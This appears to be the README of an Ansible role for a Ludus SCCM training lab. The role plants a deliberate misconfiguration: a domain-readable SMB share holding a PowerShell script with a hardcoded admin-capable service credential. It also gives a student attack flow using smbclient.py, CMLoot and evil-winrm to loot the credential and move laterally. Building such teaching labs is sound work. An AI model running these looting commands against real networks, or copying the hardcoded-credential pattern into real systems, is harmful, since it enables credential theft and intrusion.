# create_dp_loot_share

Plant a non-default SMB share on the distribution point containing a
PowerShell utility with a hardcoded credential, so
[CRED-6](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-6/cred-6_description.md)
(loot creds from SCCM Distribution Points and other site server shares)
becomes a productive attack path against the lab.

## Why

Stock SCCM leaves nothing loot-worthy on the DP — only WIM/boot media
in `SCCMContentLib$`, no scripts, no config files, no hardcoded
credentials. CRED-6 techniques (CMLoot, sccm-http-looter,
`smbclient.py` share enumeration) still execute, but the output
contains no creds, so the attack narrative dead-ends.

This role wires a deliberate misconfiguration matching the
"IT engineer left creds in an automation script" pattern the CRED-6
doc calls out as a real-world example. A student who enumerates
site-system shares finds a `Scripts` share (not in the RECON-2
baseline), downloads a `.ps1`, greps for `password`, and pulls a
working service-account credential.

## What it does

Three phases (all delegated appropriately, all idempotent):

1. **AD user creation** — creates the service account (default
   `svc_sccm_maint`, password `Password123!` — note the trailing `!`)
   with a description flagging it as an IT-Ops automation account.
   Delegated to `{{ ludus_dc_vm_name }}` so the DP host does not need
   RSAT ActiveDirectory installed.
2. **Client local-admin grant** — adds the service account to the
   local `Administrators` group on the configured client host
   (default `ps1-dev`). This is the CRED-6 payoff — the looted cred
   actually opens a lateral-movement door.
3. **Share plant** — creates `C:\Scripts` on the DP, drops
   `Reset-SCCMClientCache.ps1` (templated from
   `templates/Reset-SCCMClientCache.ps1.j2`) with the credential
   hardcoded in cleartext plus a `# TODO: move creds out of the
   script before rolling this to prod.` comment as the tell, and
   exposes the folder as SMB share `Scripts` with
   `MAYYHEM\Domain Users` read + `BUILTIN\Administrators` full.

## Design decisions

- **Opt-in by nature.** This role plants a deliberate credential
  disclosure — it is not part of any default install path. Add it
  explicitly to a distribution point's `roles:` list in
  `new-config.yml` when you want CRED-6 to be productive.
- **Payoff account is scoped to one client host, not domain-wide.**
  Least-privilege — matches how a real IT-Ops "cache reset"
  service account would be scoped. Chains cleanly into further
  attacks (extract NAA cache from the client, chain to CRED-1/
  CRED-3) without duplicating a domain-admin endgame that some
  other technique already covers.
- **Domain-authenticated read.** The share is readable by
  `Domain Users`, matching the CRED-6 doc's authenticated-SMB
  example. Not anonymous — student needs at least one domain
  credential before the plant becomes reachable.
- **Password committed intentionally.** `Password123!` is a
  lab-only string, safe to keep in source. Override in `role_vars`
  if you'd prefer a different one.

## Variables

Full defaults in `defaults/main.yml`:

| Variable | Default | Purpose |
|---|---|---|
| `ludus_sccm_dp_loot_username` | `svc_sccm_maint` | AD account name for the plant. |
| `ludus_sccm_dp_loot_password` | `Password123!` | Plaintext password. Ends up in the .ps1 and in the AD user. |
| `ludus_sccm_dp_loot_user_description` | `IT-Ops SCCM client cache maintenance automation. Ticket IT-4419.` | AD user description. Reads as a plausible IT-Ops account when enumerated. |
| `ludus_sccm_dp_loot_client_hostname` | `ps1-dev` | Client host to grant local-admin on. |
| `ludus_sccm_dp_loot_share_name` | `Scripts` | Non-default SMB share name. |
| `ludus_sccm_dp_loot_share_path` | `C:\Scripts` | Local path backing the share. |
| `ludus_sccm_dp_loot_filename` | `Reset-SCCMClientCache.ps1` | Filename dropped in the share. |

Also uses these globals from the collection: `ludus_domain_netbios_name`,
`ludus_dc_vm_name`, `defaults.ad_domain_admin`,
`defaults.ad_domain_admin_password`.

## Example: wire into `new-config.yml`

Add to the ps1-dp entry's `roles:` list, after `prep_dp`:

```yaml
      - name: mayyhem.ludus_sccm.create_dp_loot_share
        depends_on:
          - vm_name: "{{ range_id }}-ps1-dp"
            role: mayyhem.ludus_sccm.prep_dp
          - vm_name: "{{ range_id }}-ps1-dev"
            role: mayyhem.ludus_sccm.windows_base
```

The `ps1-dev` dependency guarantees the payoff host is up before the
local-admin grant runs.

## Student attack flow (verifies the plant)

```
# From any authenticated domain-user context:
smbclient.py 'mayyhem.com/domainuser:Password123@<ps1-dp>'
> shares                     # 'Scripts' appears alongside SCCMContentLib$ etc.
> use Scripts
> ls                          # Reset-SCCMClientCache.ps1
> get Reset-SCCMClientCache.ps1
> exit
grep -i password Reset-SCCMClientCache.ps1

# Or with CMLoot (default filter includes .ps1):
python3 cmloot.py 'mayyhem.com/domainuser:Password123@<ps1-dp>' -cmlootinventory /tmp/loot.txt
python3 cmloot.py 'mayyhem.com/domainuser:Password123@<ps1-dp>' -cmlootdownload /tmp/loot.txt
grep -R Password CMLootOut/

# The looted cred is a working local-admin on ps1-dev:
evil-winrm -i <ps1-dev> -u svc_sccm_maint -p 'Password123!'
```

## Idempotence

Every task no-ops on re-run. `microsoft.ad.user`, `win_group_membership`,
`win_file`, `win_share` are all state-oriented; `win_template` re-writes
the file only if content differs.
